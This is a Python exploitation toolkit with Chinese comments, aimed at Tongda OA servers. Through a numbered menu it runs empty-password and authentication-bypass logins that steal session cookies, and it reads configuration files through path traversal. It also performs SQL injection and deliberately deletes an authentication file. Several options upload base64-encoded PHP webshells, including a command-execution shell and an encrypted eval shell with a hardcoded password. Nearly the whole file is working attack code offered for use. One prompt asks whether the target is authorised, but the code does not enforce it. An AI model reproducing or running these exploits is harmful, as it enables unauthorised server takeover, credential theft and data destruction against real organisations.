import requests
import re
import time
import base64
import datetime
import uuid
import os

# 已经完成的功能如下:
# 1.获取通达版本信息(全版本) -1
# 2.常规空登录以及获取Cookie(全版本) -2
# 3.通达11.2后台上传getshell (路径不定，暂不写)
# 4.通达11.3任意文件包含漏洞、通达11.3任意文件上传、配合11.3包含上传的文件getshell -3
# 5.通达V11.x-V11.5任意用户登录获取cookie -4
# 6.通达≤11.5 后台上传getshell，原理跟11.6一样
# 7.通达11.6任意删除文件+后台file_exists函数绕过上传 -5
# 8.通达11.7 有效的任意用户登录-管理员在线
# 9.通达11.8上传ini文件+上传日志文件+getshell
# 10.通达11.9后台SQL时间盲注
# 11.老通达upload.php注入
# 12.老通达get_file.php任意文件读取
# 13.老通达安装目录泄露 待考虑

RED = '\x1b[1;91m'
BLUE = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'

def title():
    print(RED + '''
    Title: tongda-kitev1.0.1
    Version: 通达OA
    ''' + ENDC)

def Target_version(target_url): # 获取通达版本信息(全版本)
    content = ''
    content += '正在获取目标的版本信息' + '\n'
    url = target_url + '/inc/expired.php'
    try:
        response = requests.get(url=url,timeout=2)
        pattern = re.compile('<td class="Big"><span class="big3">(.*?)</span>',re.S)
        info = re.findall(pattern,response.text)
        content += '获取目标版本成功，版本信息如下：' + '\n'
        content += info[0].replace('<br>','').replace(' ','')
        print(BOLD + content + ENDC)
        return content
    except:
        content += '未发现版本信息' + '\n'
        print(BOLD + content + ENDC)
        return content

def weak_login(target_url): # 常规空登录以及获取Cookie(全版本)
    content = ''
    content += '正在尝试空口令登录' + '\n'
    url = target_url + 'logincheck.php'
    try:
        data = {'UNAME':'admin','PASSWORD':'','encode_type':'1'}
        response = requests.post(url=url,data=data,timeout=2)
        cookie_key = response.cookies.keys()
        cookie_value = response.cookies.values()
        get_cookie = ''
        for i in range(0,len(cookie_key)):
            get_cookie += cookie_key[i] + '=' + cookie_value[i] + ';' # 获取cookie并拼接成cookie格式
        # print(get_cookie)
        if '正在进入OA系统' in response.text:
            content += '空口令登录成功！' + '\n'
            content += 'URL地址为:' + target_url + '\n'
            content += 'Cookie为:' + get_cookie + '\r\n'
            print(BOLD + content + ENDC)
            return content
        else:
            content +=  '不存在空口令' + '\r\n'
            print(BOLD + content + ENDC)
            return content
    except:
        print( BOLD + "目标不存在空口令漏洞或者不能访问" + ENDC)

def file_include(target_url): # 通达11.3任意文件包含漏洞
    content = ''
    content += '正在测试是否存在任意文件包含漏洞' + '\n'
    url = target_url + '/ispirit/interface/gateway.php'
    try:
        data = {'json':'{"url":"/general/../../mysql5/my.ini"}'}
        response = requests.post(url=url,data=data,timeout=2)
        # print(response.text)
        if 'mysql' in response.text:
            content += '存在任意文件包含漏洞,路径如下:' + '\n'
            content += url + '\n'
            content += 'POST的值如下:' + '\n'
            content += 'json={"url":"/general/../../mysql5/my.ini"}' + '\r\n'
            print(BOLD + content + ENDC)
            return content
        else:
            content += '不存在任意文件包含漏洞' + '\n'
            print(BOLD + content + ENDC)
            return content
    except:
        pass

def ispirit_upload(target_url): # 通达11.3任意文件上传 结合
    content = ''
    content += '正在测试是否存在任意文件上传漏洞' + '\n'
    url = target_url + '/ispirit/im/upload.php'
    try:
        headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3'}
        data = base64.b64decode('LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5QndWQXdWM080c2lmeWhyMwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IlVQTE9BRF9NT0RFIgoKMgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlCd1ZBd1YzTzRzaWZ5aHIzCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iUCIKCgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlCd1ZBd1YzTzRzaWZ5aHIzCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iREVTVF9VSUQiCgoxCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeUJ3VkF3VjNPNHNpZnlocjMKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJBVFRBQ0hNRU5UIjsgZmlsZW5hbWU9ImpwZyIKQ29udGVudC1UeXBlOiBpbWFnZS9qcGVnCgo8P3BocAokZnAgPSBmb3BlbignaGFoYS5waHAnLCAndycpOwokYSA9IGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFLUUdWeWNtOXlYM0psY0c5eWRHbHVaeWd3S1RzS2MyVnpjMmx2Ymw5emRHRnlkQ2dwT3dvZ0lDQWdKR3RsZVQwaVpUUTFaVE15T1dabFlqVmtPVEkxWWlJN0lDOHY2SytsNWErRzZaS2w1TGk2NkwrZTVvNmw1YStHNTZDQk16TGt2WTF0WkRYbGdMem5tb1RsaVkweE51UzlqZSs4ak9tN21PaXVwT2kvbnVhT3BlV3ZodWVnZ1hKbFltVjViMjVrQ2dra1gxTkZVMU5KVDA1Ykoyc25YVDBrYTJWNU93b0pjMlZ6YzJsdmJsOTNjbWwwWlY5amJHOXpaU2dwT3dvSkpIQnZjM1E5Wm1sc1pWOW5aWFJmWTI5dWRHVnVkSE1vSW5Cb2NEb3ZMMmx1Y0hWMElpazdDZ2xwWmlnaFpYaDBaVzV6YVc5dVgyeHZZV1JsWkNnbmIzQmxibk56YkNjcEtRb0pld29KQ1NSMFBTSmlZWE5sTmpSZklpNGlaR1ZqYjJSbElqc0tDUWtrY0c5emREMGtkQ2drY0c5emRDNGlJaWs3Q2drSkNna0pabTl5S0NScFBUQTdKR2s4YzNSeWJHVnVLQ1J3YjNOMEtUc2thU3NyS1NCN0NpQWdJQ0FKQ1FrZ0pIQnZjM1JiSkdsZElEMGdKSEJ2YzNSYkpHbGRYaVJyWlhsYkpHa3JNU1l4TlYwN0lBb2dJQ0FnQ1FrSmZRb0pmUW9KWld4elpRb0pld29KQ1NSd2IzTjBQVzl3Wlc1emMyeGZaR1ZqY25sd2RDZ2tjRzl6ZEN3Z0lrRkZVekV5T0NJc0lDUnJaWGtwT3dvSmZRb2dJQ0FnSkdGeWNqMWxlSEJzYjJSbEtDZDhKeXdrY0c5emRDazdDaUFnSUNBa1puVnVZejBrWVhKeVd6QmRPd29nSUNBZ0pIQmhjbUZ0Y3owa1lYSnlXekZkT3dvSlkyeGhjM01nUTN0d2RXSnNhV01nWm5WdVkzUnBiMjRnWDE5cGJuWnZhMlVvSkhBcElIdGxkbUZzS0NSd0xpSWlLVHQ5ZlFvZ0lDQWdRR05oYkd4ZmRYTmxjbDltZFc1aktHNWxkeUJES0Nrc0pIQmhjbUZ0Y3lrN0NqOCtDZz09Iik7CmZ3cml0ZSgkZnAsICRhKTsKZmNsb3NlKCRmcCk7Cj8+Ci0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeUJ3VkF3VjNPNHNpZnlocjMtLQ==')
        response = requests.post(url=url,data=data,headers=headers,timeout=2)
        print(response.text)
        # print(ext_name_2)
        # print(ext_name_1)  # 获取目录名和图片名
        if 'OK' in response.text:
            content += '图片上传成功，正在尝试文件包含图片'
            pattern_ext2 = re.compile('\_(.*?)\|',re.S)
            pattern_ext1 = re.compile('\@(.*?)\_',re.S)
            ext_name_2 = re.findall(pattern_ext2,response.text)[0]
            ext_name_1 = re.findall(pattern_ext1,response.text)[0]
            content = file_include_upload(target_url,ext_name_1,ext_name_2,content)
            return content
        else:
            content += '不存在通达11.3任意文件上传' + '\r\n'
            print(BOLD + content + ENDC)
            return content
    except:
        pass

def file_include_upload(target_url,ext_name_1,ext_name_2,content): # 配合11.3包含上传的文件getshell
    content += '正在尝试包含上传的图片文件' + '\n'
    url = target_url + '/ispirit/interface/gateway.php'
    try:
        data = {'json':"{\"url\":\"/general/../../attach/im/%s/%s.jpg\"}" % (ext_name_1,ext_name_2)}
        # print(data)
        response = requests.post(url=url,data=data,timeout=2)
        if response.status_code == 200 and '' in response.text:
            content += '文件包含图片成功,webshell路径如下:' + '\n'
            content += target_url + '/ispirit/interface/haha.php' + '\n'
            content += 'webshell密码为rebeyond' + '\r\n'
            print(BOLD + content + ENDC)
            return content
        else:
            content += '不存在文件包含漏洞' + '\r\n'
            print(BOLD + content + ENDC)
            return content
    except:
        pass

def all_login(target_url): # 通达V11.x-V11.5任意用户登录获取cookie
    content = ''
    content += '正在尝试通达11.5任意用户登录获取cookie' + '\n'
    url = target_url + 'logincheck_code.php'
    try:
        data = {'UNAME':'admin','PASSWORD':'1111','encode_type':'1','UID':'1'}
        response = requests.post(url=url,data=data,timeout=2)
        # print(response.text[10])
        if response.text[10] == '1':
            content += '存在任意用户登录，cookie值如下: ' + '\n'
            cookie_key = response.cookies.keys()[0]  ## 拼接cookie
            cookie_value = response.cookies.values()[0]
            phpsession = cookie_key + '=' + cookie_value
            content += phpsession + '\r\n'
            print(BOLD + content + ENDC)
            return content
            # file_upload(target_url,phpsession)
        else:
            content += '不存在通达V11.x-V11.5任意用户登录漏洞' + '\r\n'
            print(BOLD + content + ENDC)
            return content
    except:
        pass

def Check_delete_file(target_url): # 检测11.6任意文件删除 有风险勿在未授权使用
    print( BOLD + '测试是否存在通达11.6任意文件删除漏洞' + ENDC)
    url = target_url + "/module/appbuilder/assets/print.php"
    try:
        response = requests.get(url=url,timeout=2)
        if response.status_code == 200:
            print( BOLD + '可能存在任意文件删除漏洞'+ ENDC )
            print(input(BOLD + '此洞有风险，请确定是否授权环境,请按任意键继续' +ENDC))
            Start_delete_file(target_url)
        else:
            print(BOLD + '不存在任意文件删除漏洞' + ENDC)
    except:
        pass

def Start_delete_file(target_url): # 开始11.6任意文件删除 有风险勿在未授权使用
    print(BOLD + '开始测试通达11.6任意文件删除漏洞' + ENDC)
    print(BOLD + '正在删除认证文件 auth.inc.php' + ENDC)
    url = target_url +  "/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
    try:
        response = requests.get(url=url,timeout=2)
        # print(response.text)
        if response.status_code==200:
            print(BOLD  + "删除成功，正在尝试上传getshell中..." + ENDC)
            file_upload(target_url)
        else:
            print(BOLD + "不存在该漏洞" + ENDC)
    except:
        pass

def file_upload(target_url): # 11.6后台上传getshell
    print(BOLD + '正在尝试后台上传getshell'+ ENDC)
    url = target_url + '/general/data_center/utils/upload.php?action=upload&filetype=test&repkid=/.<>./.<>./.<>./'
    payload_php = base64.b64decode("PD9waHAKICAgICRjb21tYW5kPSRfR0VUWyd0ZXN0J107CiAgICAkd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwogICAgJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiAgICAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwogICAgJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKICAgIGVjaG8gJHN0cm91dHB1dDsKPz4=").decode("utf-8")
    files = {'FILE1':('test.php',payload_php)}
    try:
        response = requests.post(url=url,files=files,timeout=2)
        # print(response.text)
        if response.status_code == 200:
            url_webshell = target_url + '_test.php'
            print(BOLD + 'webshell地址为:' + url_webshell + ENDC )
        else:
            print(BOLD + "不存在该漏洞" + ENDC)
    except:
        pass

def file_upload_lower(target_url,phpsession): # 11.5以下后台上传getshell，需要cookie
    print(BOLD + '正在尝试11.5以下的后台上传getshell'+ ENDC)
    url = target_url + '/general/data_center/utils/upload.php?action=upload&filetype=test&repkid=/.<>./.<>./.<>./'
    payload_php = base64.b64decode("PD9waHAKICAgICRjb21tYW5kPSRfR0VUWyd0ZXN0J107CiAgICAkd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwogICAgJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiAgICAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwogICAgJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKICAgIGVjaG8gJHN0cm91dHB1dDsKPz4=").decode("utf-8")
    files = {'FILE1':('test.php',payload_php)}
    headers = {'Cookie':phpsession + "_SERVER"} # 这里填入phpsession
    try:
        response = requests.post(url=url,files=files,headers=headers,timeout=2)
        # print(response.text)
        if response.status_code == 200:
            url_webshell = target_url + '_test.php'
            print(BOLD + 'webshell地址为:' + url_webshell + ENDC )
        else:
            print(BOLD + "不存在该漏洞" + ENDC)
    except:
        pass

def Upload_Ini(): ## 通达11.8上传user.ini文件
    print(GREEN + "URL格式 : http://127.0.0.1" + ENDC)
    target_url = input(GREEN+ '请输入你的目标URL: ' + ENDC)
    print(GREEN+("Cookie格式: USER_NAME_COOKIE=admin; PHPSESSID=xxxxx; OA_USER_ID=admin; SID_1=xxxx") + ENDC)
    cookie = input(BOLD+('请输入你的cookie: ') + ENDC)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie': cookie,
        'Content-Type': 'multipart/form-data; boundary=---------------------------17518323986548992951984057104',
    }
    payload = 'general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/.user'
    data = base64.b64decode(
        'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmluaSIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgphdXRvX3ByZXBlbmRfZmlsZT0xMTExMTEubG9nCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
    try:
        res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5)
        if res.status_code == 200 and '档案已保存' in res.text:
            print(BLUE + '[*] 成功上传.user.ini文件!' + ENDC)
            Upload_Log(target_url, cookie)
            sys.exit(0)
        else:
            print(RED + '[-] 上传.user.ini文件失败!' + ENDC)
            sys.exit(0)
    except:
        pass

def Upload_Log(target_url,cookie): ## 上传日志文件
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie': cookie,
        'Content-Type': 'multipart/form-data; boundary=---------------------------17518323986548992951984057104',
    }
    payload = '/general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/111111'
    data = base64.b64decode(
        'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmxvZyIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOyBzZXNzaW9uX3N0YXJ0KCk7CiAgICAka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsKCSRfU0VTU0lPTlsnayddPSRrZXk7CglzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319CiAgICBAY2FsbF91c2VyX2Z1bmMobmV3IEMoKSwkcGFyYW1zKTsKPz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=')
    try:
        res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5)
        if res.status_code == 200 and '档案已保存' in res.text:
            print(BLUE + '[*] 成功上传log文件!' + ENDC)
            Get_Shell(target_url, cookie)
            sys.exit(0)
        else:
            print(RED + '[-] 上传log文件失败!' + ENDC)
            sys.exit(0)
    except:
        pass

def Get_Shell(target_url,cookie): ## 通达11.8getshell
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Cookie': cookie
    }
    payload = '/general/reportshop/workshop/report/attachment-remark/form.inc.php'
    try:
        res = requests.get(url=target_url + payload, headers=headers, timeout=5)
        if res.status_code == 200:
            print(GREEN + '[+] 成功上传蚁剑shell, 密码为: rebeyond' + ENDC)
            print(GREEN + '[+] Shell地址为: {}'.format(target_url + payload) + ENDC)
            sys.exit(0)
        else:
            print(GREEN + '[+]  成功上传蚁剑shell, 密码为: rebyeond' + ENDC)
            print(GREEN + '[+] Shell地址为: {}'.format(target_url + payload) + ENDC)
            print(RED + '[!] 可能需要等待一会儿即可连接。' + ENDC)
            sys.exit(0)
    except:
        pass

def Valid_login(target_url): ## 有效的任意用户登录 需要管理员在线
    print(BOLD + '检测是否存在有效的任意登录漏洞' + ENDC)
    url = target_url + '/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0'
    try:
        response = requests.get(url=url,timeout=2)
        # print(response.text)
        if 'RELOGIN' in response.text and response.status_code == 200:
            print( BOLD + '存在未授权任意用户登录漏洞' + ENDC)
            Valid_startlogin(url)
        else:
            print( RED + '不存在任意用户登录漏洞或者已经登录' +ENDC)
    except:
        pass

def Valid_startlogin(url): ## 监控uid=1登录用户
    print( BOLD + '3秒一次测试用户是否在线' + ENDC)
    try:
        while True:
            response = requests.get(url=url,timeout=2)
            if 'RELOGIN' in response.text and response.status_code == 200:
                print( BOLD + ' [x] 目标用户处于下线状态 ' + time.asctime()+ ENDC)
                time.sleep(3)
            else:
                cookie_key = response.cookies.keys()[0]  ## 拼接cookie
                cookie_value = response.cookies.values()[0]
                phpsession = cookie_key + '=' + cookie_value
                print(RED + '目标用户处于在线状态,cookie如下:' + time.asctime() + ENDC)
                print(BOLD + phpsession + ENDC)
                break
    except:
        pass

def sql_time_injection(target_url,cookie): # 通达11.9后台SQL注入 注意请求的/
    # target_url = 'http://10.30.1.52/'
    # cookie = 'USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=fue464ee3df7hrtlili6ll5h33; SID_1=efa39e63'
    print(BOLD + '测试是否存在通达11.9后台sql时间盲注' +ENDC )
    url = target_url + "general/appbuilder/web/portal/workbench/upsharestatus"
    print(url)
    data = {'uid':'1','status':'1','id':'1;select sleep(3)'}
    headers = {'Cookie': cookie}
    try:
        time1 = datetime.datetime.now()
        response = requests.post(url=url,data=data,headers=headers)
        print(response.text)
        time2 = datetime.datetime.now()
        sec = (time2-time1).seconds
        if "操作成功" in response.text and sec == 3:
            print(BOLD + '存在时间盲注漏洞' + ENDC)
            print(BOLD + '自行登录后台抓包填入如下' + ENDC)
            print(BOLD + '目标URL地址为:' + url + ENDC )
            print(BOLD + 'POST值为: ' + 'uid=1&status=1&id=1;select sleep(4)' + ENDC)
        else:
            print(BOLD + "不存在该漏洞" + ENDC)
    except:
        pass

def old_upload_sqli(target_url):
    print(BOLD + '测试是否存在老通达upload.php注入' + ENDC)
    sqli = "/module/AIP/upload.php?T_ID=1&RUN_ID=1%df%27%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e7e7e,md5(123),0x7e7e7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)--%20xxxx&PASSWORD=123456"
    url = target_url + sqli
    try:
        response = requests.get(url=url)
        # print(response.text)
        if "202cb962ac59075b964b07152d234b70" in response.text:
            print(BOLD + '存在老通达upload注入,url地址如下' + ENDC)
            print(BOLD + url + ENDC)
        else:
            print(BOLD + '不存在该漏洞' + ENDC)
    except:
        pass

def old_get_file_download(target_url):
    print(BOLD + '测试是否存在老通达get_file任意文件下载漏洞' + ENDC)
    download = "/module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php"
    url = target_url + download
    try:
        response = requests.get(url=url)
        if "$MYSQL_USER" in response.text:
            print(BOLD + '存在老通达get_file任意文件下载漏洞' + ENDC)
            print(BOLD + url + ENDC)
        else:
            print(BOLD + '不存在该漏洞' + ENDC)
    except:
        pass


def write_file(content): #随机文件名
    with open('./%s.txt'%(uuid_str),'a+',encoding="utf-8") as f:
        f.write(content)

def title_end():
    print( BLUE + '输出结果已经保存到当前目录的%s.txt文件里'%(uuid_str) + ENDC)

def random_name(): #随机字符串
    uuid_str = uuid.uuid4().hex
    return uuid_str

def debug():
    # read_localfile_url()
    pass

if __name__ == '__main__':
    title()
    print( BLUE +("""
    1 = [探测目标URL的通达版本信息]
    2 = [测试目标通达是否存在空登录以及获取Cookie(全版本)]
    3 = [测试通达11.3任意文件包含漏洞]
    4 = [测试通达11.3任意文件上传+配合11.3包含上传的文件getshell]
    5 = [测试通达V11.x-V11.5任意用户登录获取cookie]
    6 = [测试通达11.5以下的后台文件上传getshell 需要cookie]
    7 = [测试通达11.6任意文件删除+getshell 有风险]
    8 = [测试通达11.7有效的任意用户登录以及监控]
    9 = [测试通达11.8后台文件上传getshell]
    10 = [测试通达11.9后台SQL时间盲注]
    11 = [单个URL批量测试1-2-3-4-5]
    12 = [old - 通达upload.php注入]
    13 = [old - 通达get_file.php任意文件读取]
    """) + ENDC)

    print( RED + 'URL格式:http:xxx.xxx.xx.xx' + ENDC)
    print( RED + 'Cookie格式: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=xxxx; SID_1=xxx' + ENDC)

    selection = int(input(GREEN + '请输入你要操作的数字: '+ ENDC))
    if selection == 1:
        Target_version(input(GREEN + '请输入目标URL地址：'+ ENDC))
    elif selection == 2:
        weak_login(input( GREEN +'请输入目标URL地址：'+ENDC))
    elif selection == 3:
        file_include(input( GREEN +'请输入目标URL地址：'+ENDC))
    elif selection == 4:
        ispirit_upload(input( GREEN +'请输入目标URL地址：'+ENDC))
    elif selection == 5:
        all_login(input( GREEN +'请输入目标URL地址：'+ENDC))
    elif selection ==6:
        file_upload_lower((input( GREEN +'请输入目标URL地址：'+ENDC)),(input( GREEN +'请输入目标URL的COOKIE：'+ENDC)))
    elif selection == 7:
        Check_delete_file(input( GREEN +'请输入目标URL地址：'+ENDC))
    elif selection == 8:
        Valid_login(input( GREEN +'请输入目标URL地址：'+ENDC))
    elif selection == 9:
        Upload_Ini()
    elif selection == 10:
        sql_time_injection((input( GREEN +'请输入目标URL地址：'+ENDC)),(input( GREEN +'请输入目标URL的COOKIE：'+ENDC)))
    elif selection == 11:
        uuid_str = random_name()
        target_url = input( GREEN +'请输入目标URL地址：'+ENDC)
        content = Target_version(target_url) # 批量1 探测版本
        write_file(content)
        content = weak_login(target_url) # 批量2 空口令登录
        write_file(content)
        content = file_include(target_url) # 批量3 11.3文件上传测试
        write_file(content)
        content = all_login(target_url) # 批量4 通达V11.x-V11.5任意用户登录获取cookie
        write_file(content)
        content = ispirit_upload(target_url) # 批量5 通达11.3任意文件上传 结合
        write_file(content)
        title_end()
    elif selection == 12:
        old_upload_sqli((input( GREEN +'请输入目标URL地址：'+ENDC)))
    elif selection == 13:
        old_get_file_download((input( GREEN +'请输入目标URL地址：'+ENDC)))
